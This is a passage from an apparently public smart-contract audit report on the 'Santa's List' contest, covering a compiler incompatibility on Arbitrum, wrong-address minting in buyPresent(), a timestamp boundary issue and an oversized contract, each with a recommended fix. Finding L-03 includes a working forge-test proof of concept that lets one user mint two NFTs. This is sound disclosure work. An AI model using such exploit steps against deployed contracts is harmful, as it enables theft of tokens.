forge create ./src/SantaToken.sol:SantaToken --constructor-args $ADMIN_ADDR --private-key $TEST_NET_SECU_PUB --rpc-url 'http://127.0.0.1:8545'
[⠢] Compiling...
[⠆] Compiling 38 files with 0.8.19
[⠒] Solc 0.8.19 finished in 3.19s
Deployer: ***
Deployed to: 0xc0cc44A995eE7bea6BC2564782CC92A2613ab87e
Transaction hash: 0x57e29d69c98baf710f86590a320566665923594414bffdd55a796abe67b489d5
```

Verify that minting works:

```bash
 cast call 0xc0cc44A995eE7bea6BC2564782CC92A2613ab87e\
  "balanceOf(address)(uint256)" $ADMIN_ADDR\
  --rpc-url 'http://127.0.0.1:8545'
```

Result

```bash
$: 0 #<- Value is 0
```

```bash
cast send 0xc0cc44A995eE7bea6BC2564782CC92A2613ab87e "mint(address)" $ADMIN_ADDR \
  --rpc-url 'http://127.0.0.1:8545' --private-key $TEST_NET_SECU_PUB
```

Result

```bash
$:
blockHash               0x0415285568ff35d767269a96df985c2afa9ed3bcfe95267c35d6c2ed84a9343d
blockNumber             2050981
contractAddress
cumulativeGasUsed       68074
effectiveGasPrice       3076562501
gasUsed                 68074
logs                    [{"address":"0xc0cc44a995ee7bea6bc2564782cc92a2613ab87e","topics":["0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef","0x0000000000000000000000000000000000000000000000000000000000000000","0x000000000000000000000000***"],"data":"0x0000000000000000000000000000000000000000000000000de0b6b3a7640000","blockHash":"0x0415285568ff35d767269a96df985c2afa9ed3bcfe95267c35d6c2ed84a9343d","blockNumber":"0x1f4ba5","transactionHash":"0xd665b841daf7b46314d1d33c629b4e233d8598362f37d4967e53dbd455e211aa","transactionIndex":"0x0","logIndex":"0x0","transactionLogIndex":"0x0","removed":false}]
logsBloom               0x00000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000001000008000000000000000000000000000000000000000000000000020000000000000000000800000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000002000000000000000000000000000800000000000000000000000020001000000000000000000000000000000000000000000000000000000000000000
root
status                  1
transactionHash         0xd665b841daf7b46314d1d33c629b4e233d8598362f37d4967e53dbd455e211aa
transactionIndex        0
type                    2
```

```bash
cast call 0xc0cc44A995eE7bea6BC2564782CC92A2613ab87e\ 
  "balanceOf(address)(uint256)" $ADMIN_ADDR\
  --rpc-url 'http://127.0.0.1:8545'
```

Result

```bash
$: 1000000000000000000 #<- Value is 1000000000000000000
```

## Impact

The impact is high for the following reasons:

Deployment Failure: This issue directly prevents the deployment of the contract on the Arbitrum network using Solidity 0.8.22, which is a significant obstacle for the project planning to deploy on Arbitrum.

Requirement of Version Downgrade: The need to downgrade the Solidity version to avoid this issue necessitates additional work, including re-auditing the contract. This adds time, cost, and complexity to the development process.

Potential for Unnoticed Deployment Issues: Developers might not immediately recognize this incompatibility, leading to wasted resources and potentially delayed project timelines.

## Tools Used

Manual review and official documentation

https://docs.arbitrum.io/for-devs/concepts/differences-between-arbitrum-ethereum/solidity-support

https://book.getfoundry.sh/reference/config/solidity-compiler

## Recommendations

Downgrade the contract's pragma version and test the implementation to ensure it works after the downgrade.

Always test your contract on a testnet before releasing it to ensure full functionality as expected.

## <a id='L-03'></a>L-03. `buyPresent()` function mints to wrong address

_Submitted by [tadev](https://profiles.cyfrin.io/u/tadev), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [pacelli](https://profiles.cyfrin.io/u/pacelli), [bobadj](https://profiles.cyfrin.io/u/bobadj), [timenov](https://profiles.cyfrin.io/u/timenov), [Mikea](https://profiles.cyfrin.io/u/Mikea), [0x6a70](https://profiles.cyfrin.io/u/0x6a70), [naruto](https://profiles.cyfrin.io/u/naruto), [naman1729](https://profiles.cyfrin.io/u/naman1729), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss), [rocknet](https://profiles.cyfrin.io/u/rocknet), [0xlamide](https://profiles.cyfrin.io/u/0xlamide), [0x141414](https://profiles.cyfrin.io/u/0x141414), [atlanticbase](https://profiles.cyfrin.io/u/atlanticbase), [developerjordy](https://profiles.cyfrin.io/u/developerjordy), [kiteweb3](https://profiles.cyfrin.io/u/kiteweb3), [ararara](https://profiles.cyfrin.io/u/ararara), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [dentonylifer](https://profiles.cyfrin.io/u/dentonylifer), [theFirstElderFr](https://profiles.cyfrin.io/u/theFirstElderFr), [aitor](https://profiles.cyfrin.io/u/aitor), [pelz](https://profiles.cyfrin.io/u/pelz), [Jaydhales](https://profiles.cyfrin.io/u/Jaydhales), [y0ng0p3](https://profiles.cyfrin.io/u/y0ng0p3), [Turetos](https://profiles.cyfrin.io/u/Turetos), [0xspryon](https://profiles.cyfrin.io/u/0xspryon), [n0kto](https://profiles.cyfrin.io/u/n0kto), [azmaeengh](https://profiles.cyfrin.io/u/azmaeengh), [tk3](https://profiles.cyfrin.io/u/tk3), [novodelta](https://profiles.cyfrin.io/u/novodelta), [MikeDougherty](https://profiles.cyfrin.io/u/MikeDougherty), [leogold](https://profiles.cyfrin.io/u/leogold), [denzi](https://profiles.cyfrin.io/u/denzi), [rapstyle](https://profiles.cyfrin.io/u/rapstyle), [Y403L](https://profiles.cyfrin.io/u/Y403L), [t0x1c](https://profiles.cyfrin.io/u/t0x1c), [0xloscar01](https://profiles.cyfrin.io/u/0xloscar01), [0xlouistsai](https://profiles.cyfrin.io/u/0xlouistsai), [dianivanov](https://profiles.cyfrin.io/u/dianivanov), [benbo](https://profiles.cyfrin.io/u/benbo), [zhuying](https://profiles.cyfrin.io/u/zhuying). Selected submission by: [0x141414](https://profiles.cyfrin.io/u/0x141414)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L174

https://github.com/Cyfrin/2023-11-Santas-List/blob/6627a6387adab89ae2ba2e82b38296723261c08a/src/SantasList.sol#L151

## Summary

The external function `buyPresent()` mints a Present NFT to the `msg.sender` address. This provides opportunity for a malicious actor to mint extra NFTs for themselves. \*This finding is related to other finding titled "`buyPresent()` function burns from wrong address".

## Vulnerability Details

The external function `buyPresent()` calls `_mintAndIncrement()`, which mints to the `msg.sender` address, not to the intended `presentReceiver` address, as shown below:

```
function buyPresent(address presentReceiver) external {
    // ...
    _mintAndIncrement();
}

function _mintAndIncrement() private {
    // incorrectly mints NFT to msg.sender
    _safeMint(msg.sender, s_tokenCounter++);
}
```

This introduces a new attack vector, since a related bug (as mentioned in summary) causes the incorrect burning of the SANTA ERC20 token immediately before the aforementioned minting bug, shown below:

```
function buyPresent(address presentReceiver) external {
    // incorrectly burns from `presentReceiver`
    i_santaToken.burn(presentReceiver);

    // incorrectly mints to `msg.sender`
    _mintAndIncrement();
}
```

With the existence of these two related bugs, a user with the SANTA ERC20 token may bypass the rule of only owning one NFT (as implied by line 151 balance check and line 152 revert message below).

```
if (balanceOf(msg.sender) > 0) {
    revert SantasList__AlreadyCollected();
}
```

To bypass this rule, an `EXTRA_NICE` user, aka malicious actor, may do the following steps

1. call the `collectPresent()` function, acquiring both a SANTA ERC20 token and an NFT.
2. transfer the SANTA ERC20 token to a different "friend" address
3. call the `buyPresent` function, passing the "friend" address as the parameter, burning the ERC20 token in the "friend" wallet, and minting an NFT for themself.

The below code block is a PoC (written as a forge test) demonstrating the above steps in action, ultimately allowing the attacker to hold 2 NFTs.

```
function test_buyPresentDoubleMint() public {
    SantasList.Status extraNice = SantasList.Status.EXTRA_NICE;
    address santa = makeAddr("santa");
    address thief = makeAddr("thief");
    address friend = makeAddr("friend");

    vm.warp(santasList.CHRISTMAS_2023_BLOCK_TIME() + 1);
    vm.startPrank(santa);
    santasList.checkList(thief, extraNice);
    santasList.checkTwice(thief, extraNice);
    vm.stopPrank();

    vm.startPrank(thief);
    santasList.collectPresent();
    assert(santasList.balanceOf(thief) == 1);
    assert(santaToken.balanceOf(thief) == 1e18);

    santaToken.transfer(friend, 1e18);
    santasList.buyPresent(friend);
    assert(santasList.balanceOf(thief) == 2);
}
```

## Impact

A malicious actor may mint more than one NFT for themselves.

## Tools Used

Forge

## Recommendations

- pass `msg.sender` as a param into the `i_santaToken.burn()` call
- add an `address to` param to the private function `_mintAndIncrement()`, passing `to` to `_safeMint`, instead of `msg.sender` by default.

See corrected code recommendations below:

```
function buyPresent(address presentReceiver) external {
    i_santaToken.burn(msg.sender);
    _mintAndIncrement(presentReceiver);
}

function _mintAndIncrement(address to) private {
    _safeMint(to, s_tokenCounter++);
}
```

By adding the `address to` param to `_mintAndIncrement`, be sure to pass the correct param value to all other calls to `_mintAndIncrement` in the contract. (this should often be `msg.sender`.)

Example of `_mintAndIncrement()` calls in `collectPresent()` function:

```
function collectPresent() external {
    // ... other checks
    if (s_theListCheckedOnce[msg.sender] == Status.NICE && s_theListCheckedTwice[msg.sender] == Status.NICE) {
        _mintAndIncrement(msg.sender); // add `to` param here
        return;
    } else if (
        s_theListCheckedOnce[msg.sender] == Status.EXTRA_NICE
            && s_theListCheckedTwice[msg.sender] == Status.EXTRA_NICE
    ) {
        _mintAndIncrement(msg.sender); // add `to` param here
        i_santaToken.mint(msg.sender);
        return;
    }
    revert SantasList__NotNice();
}

```
## <a id='L-04'></a>L-04. Christmas timezone + arbitrum boundry

_Submitted by [f3d0ss](https://profiles.cyfrin.io/u/f3d0ss)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L86

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol#L148C1-L150

## Vulnerability Details
The checked timestamp is in the day before Christmas in some timezone, e.g. for Pacific/Honolulu it's Sunday December 24, 2023 18:59:41 which should be acceptable but with Arbitrum the lower boundary for the block timestamp is 24 hours earlier than the current time ([for more information](https://docs.arbitrum.io/for-devs/concepts/differences-between-arbitrum-ethereum/block-numbers-and-time)). This means that in those timezone the gift could be claimed on December 23.

## Impact
In some timezone the gift could be claimed on December 23

## Recommendations
Specify in the README and in the function comment that the protocol consider the Christmas of UTC.

Alternatively change the CHRISTMAS_2023_BLOCK_TIME to be slightly after noon on Christmas, having a Christmas date even for the -12 timezone and a slightly after Christmas for the +12 timezone which may be change only 1 hour ahead by the Arbitrum sequencer remaining in the 24h range.
## <a id='L-05'></a>L-05. Oversized contract will make deployment fail

_Submitted by [TrillionX](https://profiles.cyfrin.io/u/TrillionX), [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr), [mircha](https://profiles.cyfrin.io/u/mircha). Selected submission by: [wafflemakr](https://profiles.cyfrin.io/u/wafflemakr)._      
            
### Relevant GitHub Links

https://github.com/Cyfrin/2023-11-Santas-List/blob/main/src/SantasList.sol

## Summary

Oversized contract will make deployment fail

## Vulnerability Details

`SantasList.sol:SantasList` contract is oversized (56.43 kB). This is due to the fact that the constant variable `TOKEN_URI` is stored in the bytecode, which is `51373` characters in length. 

Oversized contract can't be deployed.

### PoC

```
forge build --sizes
[⠒] Compiling...
[⠊] Compiling 2 files with 0.8.22
[⠒] Solc 0.8.22 finished in 1.85s
Compiler run successful!
| Contract       | Size (kB) | Margin (kB) |
|----------------|-----------|-------------|
| Math           | 0.086     | 24.49       |
| MockERC20      | 3.69      | 20.886      |
| MockERC721     | 3.827     | 20.749      |
| SantaToken     | 3.324     | 21.252      |
| SantasList     | 56.43     | -31.854     |
| SignedMath     | 0.086     | 24.49       |
| StdStyle       | 0.086     | 24.49       |
| Strings        | 0.086     | 24.49       |
| TokenUri       | 51.615    | -27.039     |
| console        | 0.086     | 24.49       |
| console2       | 0.086     | 24.49       |
| safeconsole    | 0.086     | 24.49       |
| stdError       | 0.592     | 23.984      |
| stdJson        | 0.086     | 24.49       |
| stdMath        | 0.086     | 24.49       |
| stdStorage     | 0.086     | 24.49       |
| stdStorageSafe | 0.086     | 24.49       |
```

## Impact

MEDIUM. Contract can't be deployed due to the `TOKEN_URI` size. 

## Tools Used

- Manual Review

## Recommendations

`TOKEN_URI` should be modified to prevent the oversized contract. Ideally, this can be an `ipfs` url, which will be shorter.




    